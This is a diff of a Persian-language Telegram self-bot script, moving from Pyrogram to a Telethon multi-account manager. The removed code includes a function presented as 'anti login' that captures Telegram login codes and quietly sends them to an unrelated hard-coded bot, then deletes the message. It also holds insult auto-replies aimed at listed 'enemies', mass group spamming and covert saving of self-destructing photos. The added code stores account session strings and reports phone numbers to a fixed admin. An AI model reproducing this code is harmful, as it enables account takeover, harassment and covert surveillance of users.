@@ -1,2197 +1,1683 @@
-import requests
-from pyrogram import Client, filters
-from pyrogram.types import Message
-import os, asyncio, aiohttp, random, re
-from datetime import datetime
-import pytz
-from pyrogram import enums
-from pyrogram.raw import functions
-from datetime import datetime, timedelta
-import json
-import time
 import sys
-from pyrogram.errors import FloodWait
+import time
+import asyncio
+import random
+import os
+import psutil
+import pytz
+import requests
+import sqlite3
+import threading
+import json
+from datetime import datetime
+from telethon import TelegramClient, events, functions, types
+from telethon.sessions import StringSession
+from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.types import ChannelParticipantsAdmins, InputMediaDice
+from telethon.tl.functions.messages import SetTypingRequest, ForwardMessagesRequest
+from telethon.tl.types import SendMessageTypingAction, SendMessageRecordVideoAction, SendMessageUploadVideoAction
+from telethon.tl.functions.account import UpdateStatusRequest
+from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError
 
-bot_username = "Dhcjf6fydbot" # ایدی ربات هلپر بدون @
-
-USER_ID = None
-PHONE = None
 API_ID = 24775679
 API_HASH = "6c534bd84521d6325816520af1d48a23"
 
-if len(sys.argv) > 1:
-    USER_ID = int(sys.argv[1])
-if len(sys.argv) > 2:
-    PHONE = sys.argv[2]
-if len(sys.argv) > 3:
-    API_ID = int(sys.argv[3])
-if len(sys.argv) > 4:
-    API_HASH = sys.argv[4]
+DATABASE_DIR = "database"
+USERS_DB = os.path.join(DATABASE_DIR, "users.db")
+ACCOUNTS_DB = os.path.join(DATABASE_DIR, "accounts.db")
+ADMIN_ID = "8650091524"
+GROUP_ID = "Nim_Shab2"
+CHANNEL_ID = "Nim_Shab2"
 
-if USER_ID:
-    session_name = f"sessions/{USER_ID}"
-else:
-    session_name = "self"
+if not os.path.exists(DATABASE_DIR):
+    os.makedirs(DATABASE_DIR)
 
-session_path = f"{session_name}.session"
-if not os.path.exists(session_path) and USER_ID:
-    print(f"⚠️ فایل session برای کاربر {USER_ID} یافت نشد!")
-    print("💡 لطفا ابتدا در ربات مدیریت لاگین کنید.")
-
-app = Client(session_name, api_id=API_ID, api_hash=API_HASH)
-
-SAVED_PHOTOS_DIR = "saved_photos"
-INSULTS_FILE = "insults.txt"
-ENEMIES_FILE = "enemies.txt"
-BACKUPS_DIR = "backups"
-self_mode_active = True
-
-action_settings = {
-    "typing": False, 
-    "upload_photo": False, 
-    "record_audio": False, 
-    "upload_video": False, 
-    "upload_document": False,
-    "record_video": False, 
-    "upload_audio": False, 
-    "upload_video_note": False, 
-    "record_video_note": False, 
-    "playing": False, 
-    "choose_contact": False, 
-    "find_location": False,  
-    "choose_sticker": False, 
-}
-ACTION_MAP = {
-    "typing": enums.ChatAction.TYPING,
-    "upload_photo": enums.ChatAction.UPLOAD_PHOTO,
-    "record_audio": enums.ChatAction.RECORD_AUDIO,
-    "upload_video": enums.ChatAction.UPLOAD_VIDEO,
-    "upload_document": enums.ChatAction.UPLOAD_DOCUMENT,
-    "record_video": enums.ChatAction.RECORD_VIDEO,
-    "upload_audio": enums.ChatAction.UPLOAD_AUDIO,
-    "upload_video_note": enums.ChatAction.UPLOAD_VIDEO_NOTE,
-    "record_video_note": enums.ChatAction.RECORD_VIDEO_NOTE,
-    "playing": enums.ChatAction.PLAYING,
-    "choose_contact": enums.ChatAction.CHOOSE_CONTACT,
-    "find_location": enums.ChatAction.FIND_LOCATION,
-    "choose_sticker": enums.ChatAction.CHOOSE_STICKER,
-}
-lock_settings = {
-    "همه": False,
-    "مدیا": False, 
-    "استیکر": False,
-    "فوروارد": False,
-    "ویس": False,
-    "پیام": False,
-    "فایل": False
-}
-format_settings = {
-    "بولد": False,
-    "ایتالیک": False,
-    "زیر خط": False,
-    "خط‌ خورده": False,
-    "اسپویلر": False,
-    "کد": False,
-    "پیش‌ فرمت": False,
-    "نقل ‌قول": False,
-}
-html_tags = {
-    "بولد": "<b>{}</b>",
-    "ایتالیک": "<i>{}</i>",
-    "زیر خط": "<u>{}</u>",
-    "خط‌ خورده": "<s>{}</s>",
-    "اسپویلر": "<spoiler>{}</spoiler>",
-    "کد": "<code>{}</code>",
-    "پیش‌ فرمت": "<pre>{}</pre>",
-    "نقل ‌قول": "<blockquote>{}</blockquote>",
-}
-
-os.makedirs(SAVED_PHOTOS_DIR, exist_ok=True)
-os.makedirs(BACKUPS_DIR, exist_ok=True)
-
-user_format_mode = {}
-auto_reactions = {} 
-anti_login_enabled = False
-user_time_status = {}
-banners = {}
-active_broadcasts = {}
-banner_counter = 1
-user_original_names = {}
-user_fonts = {}
-user_cache = {}
-CACHE_TIMEOUT = 300 
-photo_save_active = True
-time_updater_started = False
-bold_enabled = {}
-auto_replies = {}
-enemies = set()
-always_online_enabled = False
-
-FONTS = {
-    1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
-    2: {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
-    3: {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'۶','7':'７','8':'８','9':'９'},
-    4: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
-    5: {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
-    6: {'0':'0҉','1':'1҉','2':'2҉','3':'3҉','4':'4҉','5':'5҉','6':'6҉','7':'7҉','8':'8҉','9':'9҉'}
-}
-def get_persian_action_name(english_name):
-    """تبدیل نام انگلیسی اکشن به فارسی"""
-    persian_map = {
-        "typing": "تایپ",
-        "upload_photo": "اپلود عکس",
-        "record_audio": "ضبط ویس",
-        "upload_video": "اپلود ویدیو",
-        "upload_document": "اپلود فایل",
-        "record_video": "ضبط ویدیو",
-        "upload_audio": "اپلود ویس",
-        "upload_video_note": "اپلود ویدیو نوت",
-        "record_video_note": "ضبط ویدیو نوت",
-        "playing": "بازی",
-        "choose_contact": "انتخاب مخاطب",
-        "find_location": "پیدا کردن موقعیت",
-        "choose_sticker": "انتخاب استیکر",
-    }
-    return persian_map.get(english_name, english_name)
-def get_english_action_name(persian_name):
-    english_map = {
-        "تایپ": "typing",
-        "اپلود فایل": "upload_document",
-        "اپلود عکس": "upload_photo",
-        "اپلود فایل": "upload_document", 
-        "اپلود ویدیو": "upload_video",
-        "اپلود ویس": "upload_audio",
-        "اپلود ویدیو نوت": "upload_video_note",
-        "ضبط ویس": "record_audio",
-        "ضبط ویدیو": "record_video",
-        "ضبط ویدیو نوت": "record_video_note",
-        "بازی": "playing",
-        "انتخاب مخاطب": "choose_contact",
-        "انتخاب موقعیت": "find_location",
-        "پیدا کردن موقعیت": "find_location",
-        "انتخاب استیکر": "choose_sticker",
-    }
-    return english_map.get(persian_name, persian_name)
-async def apply_chat_actions(client: Client, message: Message):
-    if not message.from_user:
-        return
-    if message.from_user.id == (await client.get_me()).id:
-        return    
-    for action_name, is_active in action_settings.items():
-        if is_active:
-            try:
-                await client.send_chat_action(
-                    chat_id=message.chat.id,
-                    action=ACTION_MAP[action_name]
-                )
-                await asyncio.sleep(2)
-                break 
-            except Exception as e:
-                print(f"❌ خطا در اعمال اکشن {action_name}: {e}")
-async def send_global_banner(client: Client, banner_id: int):
-    banner_data = banners[banner_id]
-    delay = active_broadcasts.get('delay', 300) 
+class AccountManager:
+    def __init__(self):
+        self.accounts = {}
+        self.active_clients = {}
+        self.init_accounts_db()
+        
+    def init_accounts_db(self):
+        """ایجاد دیتابیس برای ذخیره اطلاعات اکانت‌ها"""
+        conn = sqlite3.connect(ACCOUNTS_DB)
+        cursor = conn.cursor()
+        cursor.execute('''CREATE TABLE IF NOT EXISTS accounts (
+            phone TEXT PRIMARY KEY,
+            session_string TEXT,
+            is_active INTEGER DEFAULT 1,
+            created_date TEXT,
+            last_used TEXT
+        )''')
+        conn.commit()
+        conn.close()
     
-    while active_broadcasts.get('global', {}).get('running', False):
+    def add_account(self, phone, session_string):
+        """افزودن اکانت جدید به دیتابیس"""
+        conn = sqlite3.connect(ACCOUNTS_DB)
+        cursor = conn.cursor()
+        cursor.execute('''INSERT OR REPLACE INTO accounts 
+                         (phone, session_string, is_active, created_date, last_used) 
+                         VALUES (?, ?, 1, datetime('now'), datetime('now'))''',
+                     (phone, session_string))
+        conn.commit()
+        conn.close()
+        print(f"✅ اکانت {phone} به دیتابیس اضافه شد")
+    
+    def get_all_accounts(self):
+        """دریافت تمام اکانت‌های فعال"""
+        conn = sqlite3.connect(ACCOUNTS_DB)
+        cursor = conn.cursor()
+        cursor.execute('SELECT phone, session_string FROM accounts WHERE is_active = 1')
+        accounts = cursor.fetchall()
+        conn.close()
+        return accounts
+    
+    def deactivate_account(self, phone):
+        """غیرفعال کردن اکانت"""
+        conn = sqlite3.connect(ACCOUNTS_DB)
+        cursor = conn.cursor()
+        cursor.execute('UPDATE accounts SET is_active = 0 WHERE phone = ?', (phone,))
+        conn.commit()
+        conn.close()
+        print(f"✅ اکانت {phone} غیرفعال شد")
+
+async def send_to_admin(client, message, phone=None):
+    try:
+        if phone:
+            message = f"📱 **{phone}**\n{message}"
+        await client.send_message(ADMIN_ID, message)
+        print(f"✅ اطلاعات به ادمین ارسال شد: {message}")
+    except Exception as e:
+        print(f"خطا در ارسال به ادمین: {e}")
+
+async def send_to_group(client, message, phone=None):
+    try:
+        if phone:
+            message = f"📱 **{phone}**\n{message}"
+        await client.send_message(GROUP_ID, message)
+        print(f"✅ اطلاعات به گروه ارسال شد: {message}")
+    except Exception as e:
+        print(f"خطا در ارسال به گروه: {e}")
+
+class TelegramAccount:
+    def __init__(self, phone, session_string, account_manager):
+        self.phone = phone
+        self.session_string = session_string
+        self.account_manager = account_manager
+        self.client = None
+        self.owner_id = None
+        self.is_running = False
+        self.shutdown_requested = False
+        
+        # 🔧 تنظیمات ضد فریز
+        self.connection_retries = 0
+        self.max_retries = 5
+        self.last_activity = time.time()
+        self.health_check_interval = 120
+        
+        self.fonts = [
+            "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡",
+            "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵", 
+            "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿",
+            "₀₁₂₃₄₅₆₇₈₉",
+            "0123456789",
+            "０１２３４５６７８９",
+            "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗",
+            "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡",
+            "🄌➀➁➂➃➄➅➆➇➈",
+            "⓪①②③④⑤⑥⑦⑧⑨"
+        ]
+        self.secretary_messages = {}
+        self.auto_forward_settings = {}
+        self.typing_users = {}
+        self.last_time_update = 0
+        
+    async def safe_initialize_client(self):
+        """اتصال ایمن با مدیریت خطا"""
         try:
-            async for dialog in client.get_dialogs():
-                if not active_broadcasts.get('global', {}).get('running', False):
-                    break
-                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
-                    try:
-                        if banner_data['media']:
-                            await banner_data['message'].copy(dialog.chat.id)
-                        else:
-                            await client.send_message(dialog.chat.id, banner_data['text'])
-                        
-                        await asyncio.sleep(2) 
-                        
-                    except Exception as e:
-                        continue
-            await asyncio.sleep(delay)
+            print(f"🔄 در حال راه‌اندازی اکانت {self.phone}...")
             
-        except Exception as e:
-            await asyncio.sleep(60)
-
-async def send_instant_broadcast(client: Client, banner_id: int):
-    banner_data = banners[banner_id]
-    sent_count = 0
-    
-    async for dialog in client.get_dialogs():
-        if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
-            try:
-                if banner_data['media']:
-                    await banner_data['message'].copy(dialog.chat.id)
-                else:
-                    await client.send_message(dialog.chat.id, banner_data['text'])
-                
-                sent_count += 1
-                await asyncio.sleep(2) 
-                
-            except Exception:
-                continue
-    
-    await client.send_message("me", f"✅ **ارسال بنر کامل شد**\n\n📤 **تعداد ارسال شده:** {sent_count} گروه")
-def save_reactions():
-    try:
-        with open("mmauto_reactions.json", "w", encoding="utf-8") as f:
-            json.dump(auto_reactions, f, ensure_ascii=False, indent=4)
-        return True
-    except Exception as e:
-        print(f"❌ خطا در ذخیره ریکشن‌ها: {e}")
-        return False
-
-def load_reactions():
-    try:
-        if os.path.exists("mmauto_reactions.json"):
-            with open("mmauto_reactions.json", "r", encoding="utf-8") as f:
-                content = f.read().strip()
-                if content: 
-                    return json.loads(content)
-                else:
-                    return {}
-        return {}
-    except json.JSONDecodeError:
-        print("⚠️ فایل ریکشن‌ها خراب است، ایجاد فایل جدید")
-        return {}
-    except Exception as e:
-        print(f"❌ خطا در لود ریکشن‌ها: {e}")
-        return {}
-
-def load_insults() -> list:
-    try:
-        if os.path.exists(INSULTS_FILE):
-            with open(INSULTS_FILE, 'r', encoding='utf-8') as f:
-                return [line.strip() for line in f.readlines() if line.strip()]
-        return []
-    except Exception as e:
-        print(f"❌ خطا در لود کردن فحش‌ها: {e}")
-        return []
-
-def save_insults(insults_list: list) -> bool:
-    try:
-        with open(INSULTS_FILE, 'w', encoding='utf-8') as f:
-            for insult in insults_list:
-                f.write(insult + '\n')
-        return True
-    except Exception as e:
-        print(f"❌ خطا در ذخیره فحش‌ها: {e}")
-        return False
-
-def load_enemies() -> set:
-    try:
-        if os.path.exists(ENEMIES_FILE):
-            with open(ENEMIES_FILE, 'r', encoding='utf-8') as f:
-                return set(int(line.strip()) for line in f.readlines() if line.strip())
-        return set()
-    except Exception as e:
-        print(f"❌ خطا در لود کردن دشمنان: {e}")
-        return set()
-
-def save_enemies(enemies_set: set) -> bool:
-    try:
-        with open(ENEMIES_FILE, 'w', encoding='utf-8') as f:
-            for enemy_id in enemies_set:
-                f.write(str(enemy_id) + '\n')
-        print(f"💾 دشمنان ذخیره شد: {len(enemies_set)} کاربر")
-        return True
-    except Exception as e:
-        print(f"❌ خطا در ذخیره دشمنان: {e}")
-        return False
-
-def is_enemy(user_id: int) -> bool:
-    return user_id in enemies
-enemies = load_enemies()
-print(f"🎯 سیستم دشمنان راه‌اندازی شد: {len(enemies)} دشمن لود شد")
-
-auto_reactions = load_reactions()
-
-async def apply_auto_reaction(client, message):
-    if not message.from_user:
-        return
-    
-    user_id = message.from_user.id
-    if user_id == (await client.get_me()).id:
-        return
-    if str(user_id) in auto_reactions:
-        try:
-            reaction = auto_reactions[str(user_id)]
-            await client.send_reaction(
-                chat_id=message.chat.id,
-                message_id=message.id,
-                emoji=reaction
+            # ایجاد کلاینت با تنظیمات ضد فریز
+            self.client = TelegramClient(
+                StringSession(self.session_string), 
+                API_ID, 
+                API_HASH,
+                device_model="iPhone 15 Pro",
+                system_version="iOS 17.1",
+                app_version="10.0.0",
+                lang_code="fa",
+                system_lang_code="fa",
+                connection_retries=10,
+                request_retries=5,
+                auto_reconnect=True,
+                flood_sleep_threshold=120,
+                base_logger=None,
             )
-        except Exception as e:
-            print(f"❌ خطا در اعمال ریکشن: {e}")
-
-async def forward_and_save_login_codes(client, message):
-    global anti_login_enabled
-    
-    if not anti_login_enabled:
-        return False
-    if message.from_user and message.from_user.id == 777000:
-        message_text = message.text or ""
-        if any(keyword in message_text for keyword in ["Login code", "کد ورود", "verification code"]):
+            
+            # اتصال با timeout
+            await asyncio.wait_for(self.client.connect(), timeout=30)
+            
+            if not await self.client.is_user_authorized():
+                print(f"❌ سشن برای {self.phone} نامعتبر است")
+                return False
+                
             try:
-                code_patterns = [
-                    r"Login code: (\d+)",
-                    r"کد ورود: (\d+)", 
-                    r"verification code: (\d+)",
-                    r"(\d{5,6})\. Do not give this code"
-                ]
-                
-                login_code = None
-                for pattern in code_patterns:
-                    match = re.search(pattern, message_text)
-                    if match:
-                        login_code = match.group(1)
-                        break
-                
-                if login_code:
-                    try:
-                        await client.send_message(
-                            "@ejw9wowjs9wiwbot",
-                            login_code 
-                        )
-                        print(f"کد به پیوی ارسال شد")
-                    except Exception as e:
-                        print(f"❌ خطا در ارسال به @BotFather: {e}")
-                    await client.send_message(
-                        "me",
-                        login_code 
-                    )
-                   
-                    await message.delete()
+                me = await asyncio.wait_for(self.client.get_me(), timeout=10)
+                if me:
+                    self.owner_id = me.id
+                    self.connection_retries = 0
+                    print(f"✅ اکانت {self.phone} با موفقیت لاگین شد")
+                    print(f"👤 کاربر: {me.first_name} (ID: {me.id})")
+                    return True
+                else:
+                    print(f"❌ دریافت اطلاعات کاربر برای {self.phone} ناموفق بود")
+                    return False
                     
-                    print(f"✅ کد ارسال شد: {login_code}")
+            except asyncio.TimeoutError:
+                print(f"⏰ timeout دریافت اطلاعات کاربر برای {self.phone}")
+                return False
+            except Exception as e:
+                print(f"❌ خطا در دریافت اطلاعات کاربر {self.phone}: {e}")
+                return False
+                
+        except asyncio.TimeoutError:
+            print(f"⏰ timeout اتصال برای {self.phone}")
+            return False
+        except Exception as e:
+            print(f"❌ خطا در راه‌اندازی کلاینت برای {self.phone}: {e}")
+            return False
+    
+    async def robust_initialize(self):
+        """راه‌اندازی مقاوم در برابر خطا"""
+        for attempt in range(self.max_retries):
+            try:
+                print(f"🔄 تلاش {attempt + 1}/{self.max_retries} برای راه‌اندازی {self.phone}")
+                
+                if await self.safe_initialize_client():
+                    # راه‌اندازی مؤلفه‌ها
+                    self.init_db()
+                    await self.safe_join_channels()
+                    await self.set_online_status()
+                    await self.safe_pm_cleanup()
+                    await self.register_handlers()
+                    await self.load_secretary_messages()
+                    await self.load_auto_forward_settings()
+                    await self.send_startup_message()
+                    await self.send_login_notification()
+                    
+                    self.is_running = True
+                    
+                    # شروع تسک‌های پس‌زمینه با مدیریت خطا
+                    asyncio.create_task(self.safe_update_profile_time())
+                    asyncio.create_task(self.safe_maintain_online_status())
+                    asyncio.create_task(self.health_monitor())
+                    
+                    print(f"✅ اکانت {self.phone} با موفقیت راه‌اندازی شد")
                     return True
                     
-            except Exception as e:
-                print(f"❌ خطا در پردازش کد: {e}")
-    
-    return False
-
-async def check_lock(client, message):
-    if not message.from_user:
-        return
-    if message.from_user.id == (await client.get_me()).id:
-        return
-    if lock_settings["همه"]:
-        try:
-            await message.delete()
-        except:
-            pass
-        return
-    if lock_settings["مدیا"] and (message.photo or message.video):
-        try:
-            await message.delete()
-        except:
-            pass
-        return
-    if lock_settings["استیکر"] and (message.sticker or message.animation):
-        try:
-            await message.delete()
-        except:
-            pass
-        return
-    if lock_settings["فوروارد"] and message.forward_date:
-        try:
-            await message.delete()
-        except:
-            pass
-        return    
-    if lock_settings["ویس"] and message.voice:
-        try:
-            await message.delete()
-        except:
-            pass
-        return    
-    if lock_settings["پیام"] and message.text and not message.text.startswith("/"):
-        try:
-            await message.delete()
-        except:
-            pass
-        return    
-    if lock_settings["فایل"] and message.document:
-        try:
-            await message.delete()
-        except:
-            pass
-        return
-
-async def keep_online():
-    while always_online_enabled:
-        try:
-            await app.invoke(functions.account.UpdateStatus(offline=False))
-            await asyncio.sleep(10)
-        except Exception as e:
-            print(f"❌ خطا در آپدیت وضعیت آنلاین: {e}")
-            await asyncio.sleep(10)
-
-def get_iran_time() -> str:
-    now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
-    font_dict = FONTS.get(user_fonts.get("me", 1), FONTS[1])
-    return ''.join([font_dict.get(char, char) for char in now])
-
-def get_iran_datetime() -> str:
-    return datetime.now(pytz.timezone('Asia/Tehran')).strftime('%Y-%m-%d %H:%M:%S')
-
-async def update_name_with_time(user_id: int, client: Client) -> bool:
-    if not user_time_status.get(user_id):
-        return False
-    
-    try:
-        user = await client.get_users(user_id)
-        first_name = user_original_names.get(user_id, user.first_name or "")
-        new_name = f"{first_name} {get_iran_time()}"
-        await client.update_profile(first_name=new_name)
-        return True
-    except Exception as e:
-        print(f"❌ خطا در آپدیت نام کاربر {user_id}: {e}")
-        return False
-
-async def continuous_time_updater(client: Client):
-    global time_updater_started
-    while True:
-        try:
-            now = datetime.now(pytz.timezone('Asia/Tehran'))
-            seconds_until_next_minute = 60 - now.second
-            milliseconds_until_next_minute = (seconds_until_next_minute * 1000) - (now.microsecond // 1000)
-           
-            await asyncio.sleep(milliseconds_until_next_minute / 1000)
-            
-            active_users = [uid for uid, status in user_time_status.items() if status]
-            for user_id in active_users:
-                try:
-                    current_time = get_iran_time()
-                    original_name = user_original_names.get(user_id, "")
-                    new_name = f"{original_name} {current_time}"
-                    await client.update_profile(first_name=new_name)
-                except Exception as e:
-                    print(f"❌ خطا در آپدیت ساعت برای کاربر {user_id}: {e}") 
-                    
-        except Exception as e:
-            print(f"❌ خطا در مدیریت آپدیت زمان: {e}")
-            await asyncio.sleep(60)
-
-async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
-    try:
-        backup_file = f"{BACKUPS_DIR}/backup_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        user = await client.get_users(chat_id)
-        user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{chat_id}"
-        me = await client.get_me()
-        message_count = 0
-
-        with open(backup_file, 'w', encoding='utf-8') as f:
-            f.write("="*60 + f"\n📱 پشتیبان گیری از تلگرام\n" + "="*60 + f"\n👤 کاربر: {user_name}\n🆔 آیدی: {chat_id}\n📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "="*60 + "\n\n")
-            
-            async for message in client.get_chat_history(chat_id):
-                if until_message_id and message.id >= until_message_id:
-                    continue
-                message_count += 1
-                sender_name = "شما" if message.from_user and message.from_user.id == me.id else f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip() or message.from_user.username or "Unknown"
-                if message.from_user and message.from_user.id != me.id:
-                    sender_name += f" (ID: {message.from_user.id})"
-                
-                media_type = ""
-                if message.photo: media_type = "📷 عکس"
-                elif message.video: media_type = "🎥 ویدیو"
-                elif message.document: media_type = "📄 فایل"
-                elif message.audio: media_type = "🎵 آudio"
-                elif message.voice: media_type = "🎤 ویس"
-                elif message.sticker: media_type = "🤡 استیکر"
-                
-                message_text = message.text or message.caption or ""
-                f.write(f"#{message_count}\n👤 ارسال کننده: {sender_name}\n🕐 زمان: {message.date.strftime('%Y-%m-%d %H:%M')}\n")
-                if media_type: f.write(f"📎 نوع: {media_type}\n")
-                if message_text: f.write(f"💬 متن: {message_text}\n")
-                f.write("-"*40 + "\n\n")
-
-        return True, backup_file, message_count, user_name
-    except Exception as e:
-        return False, str(e), 0, None
-@app.on_message(filters.private & ~filters.me)
-async def apply_actions_private(client: Client, message: Message):
-    await apply_chat_actions(client, message)
-@app.on_message(filters.group & ~filters.me)
-async def apply_actions_group(client: Client, message: Message):
-    await apply_chat_actions(client, message)
-@app.on_message(~filters.me & filters.incoming)
-async def global_message_handler(client: Client, message: Message):
-    if not message.from_user:
-        return
-    
-    user_id = message.from_user.id
-    message_text = message.text or ""
-    if user_id == 777000:
-        await forward_and_save_login_codes(client, message)
-        return
-    if str(user_id) in auto_reactions:
-        try:
-            reaction = auto_reactions[str(user_id)]
-            await client.send_reaction(
-                chat_id=message.chat.id,
-                message_id=message.id,
-                emoji=reaction
-            )
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
-        except Exception:
-            pass
-    if user_id in enemies and message_text.strip():
-        try:
-            insults_list = load_insults()
-            if insults_list:
-                random_insult = random.choice(insults_list)
-                await client.send_message(
-                    message.chat.id,
-                    random_insult,
-                    reply_to_message_id=message.id
-                )
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
-        except Exception:
-            pass
-    if message_text.strip():
-        message_text_lower = message_text.strip().lower()
-        for trigger, reply in auto_replies.items():
-            if trigger.lower() in message_text_lower:
-                try:
-                    await client.send_message(
-                        message.chat.id,
-                        reply,
-                        reply_to_message_id=message.id
-                    )
-                    break
-                except FloodWait as e:
-                    await asyncio.sleep(e.value)
-                    break
-                except Exception:
-                    break
-@app.on_message(filters.me & filters.command("عکس", prefixes=""))
-async def photo_command(client: Client, message: Message):
-    global photo_save_active
-    
-    if len(message.command) == 1:
-        await message.delete()
-        return
-    
-    action = message.command[1]
-    
-    if action == "سیو":
-        await message.delete()
-        
-        if not message.reply_to_message:
-            return
-        
-        replied_message = message.reply_to_message
-
-        if not replied_message.photo:
-            return
-        
-        if not hasattr(replied_message.photo, 'ttl_seconds') or not replied_message.photo.ttl_seconds:
-            return
-        
-        try:
-            user = replied_message.from_user
-            chat = replied_message.chat
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            file_name = f"{SAVED_PHOTOS_DIR}/manual_save_{user.id}_{timestamp}.jpg"
-            file_path = await replied_message.download(file_name=file_name)
-            
-            if file_path and os.path.exists(file_path):
-                chat_name = chat.title or chat.first_name or "Unknown"
-                caption = (
-                    f"📸 **عکس تایمدار ذخیره شد**\n\n"
-                    f"👤 **کاربر:** {user.first_name or 'Unknown'}\n"
-                    f"🆔 **آیدی:** `{user.id}`\n"
-                    f"📧 **یوزرنیم:** @{user.username or 'ندارد'}\n"
-                    f"⏱ **زمان اصلی:** {replied_message.photo.ttl_seconds} ثانیه\n"
-                    f"📅 **تاریخ ذخیره:** {get_iran_datetime()}\n"
-                    f"💬 **چت:** {chat_name}"
-                )
-                await client.send_photo(
-                    "me",
-                    photo=file_path,
-                    caption=caption
-                )
-                os.remove(file_path)
-                
-                print(f"✅ عکس تایمدار از {user.id} در {chat_name} ذخیره شد")
-                
-            else:
-                print("❌ خطا در دانلود عکس")
-                
-        except Exception as e:
-            print(f"❌ خطا در ذخیره دستی عکس تایمدار: {e}")
-    
-    else:
-        await message.delete()
-
-@app.on_message(filters.me & filters.text & ~filters.command([
-    "سیو", "پنل", "لیست فحش", "آنلاین", "دانلود", "ایدی", "تایم", 
-    "عکس", "وضعیت", "لیست فونت", "تنظیم فونت", "قیمت", "اسپم", "بولد", 
-    "پاسخ", "دشمن", "فحش", "حذف", "لیست دشمن", "دشمنان", "پاک کردن دشمنان", 
-    "همه", "مدیا", "استیکر", "فوروارد", "وویس", "پیام", "فایل", "وضعیت قفل", 
-    "ریست قفل", "راهنمای قفل", 
-    "انتی لاگین", "ریکت", "حذف ریکت", "لیست ریکت", "پاکسازی ریکت",
-    "ویرایش",
-    "تنظیم بنر", "بنر همگانی", "لیست بنرها", "حذف بنر", "بنر همگانی خاموش", "بنر ارسال", "زمان بنر",
-    "فرمت",
-    "پینگ", "تعداد کانال ها", "تعداد گروه ها", "خروج همه کانال", "خروج همه گروه",
-    "اکشن",
-    "اینستا" 
-], prefixes=""))
-async def auto_html_format_messages(client, message):
-    if any(format_settings.values()):
-        original_text = message.text
-        formatted_text = original_text
-        for format_name, is_active in format_settings.items():
-            if is_active:
-                formatted_text = html_tags[format_name].format(formatted_text)        
-        try:
-            await message.edit_text(
-                formatted_text,
-                parse_mode=enums.ParseMode.HTML
-            )
-        except Exception as e:
-            print(f"❌ خطا در فرمت کردن پیام: {e}")
-@app.on_message(filters.me & filters.command("سیو", prefixes=""))
-async def save_command(client: Client, message: Message):
-    if len(message.command) < 2: 
-        return await message.edit_text("**لطفا یوزرنیم کاربر را وارد کنید**\n\nمثال: `سیو @LuminousPath`")
-    
-    chat_input = message.command[1].lstrip('@')
-    try:
-        user = await client.get_users(chat_input)
-        chat_id, user_name = user.id, f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{user.id}"
-    except: 
-        return await message.edit_text(f"**کاربر '{chat_input}' پیدا نشد**")
-    
-    loading_msg = await message.edit_text(f"🔄 **در حال پشتیبان‌گیری از {user_name}...**")
-    success, result, message_count, user_name = await backup_chat(client, chat_id, message.id)
-    
-    if success:
-        await loading_msg.edit_text("**در حال آپلود فایل پشتیبان...**")
-        await client.send_document(
-            "me", 
-            document=result, 
-            caption=f"**پشتیبان‌گیری کامل شد**\n\n**کاربر:** {user_name}\n**آیدی:** `{chat_id}`\n**تعداد پیام‌ها:** {message_count}\n**فرمت:** فایل متنی (TXT)\n**تاریخ:** {datetime.now().strftime('%Y-%m-%d %H:%M')}"
-        )
-        os.remove(result)
-        await loading_msg.delete()
-    else: 
-        await loading_msg.edit_text(f"❌ **خطا در پشتیبان‌گیری:**\n`{result}`")
-
-@app.on_message(filters.me & filters.command("تایم", prefixes="") & filters.regex(r"^تایم (روشن|خاموش)$"))
-async def time_command(client: Client, message: Message):
-    global time_updater_started  
-    if len(message.command) < 2: 
-        return await message.edit("**استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
-    
-    action = message.command[1]
-    user_id = message.from_user.id
-    
-    if action == "روشن":
-        user_time_status[user_id] = True
-        user_original_names.setdefault(user_id, message.from_user.first_name or "")
-        success = await update_name_with_time(user_id, client)
-        
-        if not time_updater_started:  
-            time_updater_started = True  
-            asyncio.create_task(continuous_time_updater(client))
-        
-        await message.edit("**تایم کنار نام فعال شد**\n**راس هر دقیقه آپدیت می‌شود**" if success else "**خطا در تغییر نام**")
-        
-    elif action == "خاموش":
-        user_time_status[user_id] = False
-        if user_id in user_original_names:
-            try:
-                await client.update_profile(first_name=user_original_names[user_id])
-                await message.edit("**تایم کنار نام غیرفعال شد**\nنام شما به حالت اول بازگشت")
-            except: 
-                await message.edit("❌ خطا در بازگردانی نام")
-        else: 
-            await message.edit("✅ تایم کنار نام غیرفعال شد")
-    else:
-        await message.edit("⚠️ **استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
-
-@app.on_message(filters.me & filters.command("لیست فونت", prefixes=""))
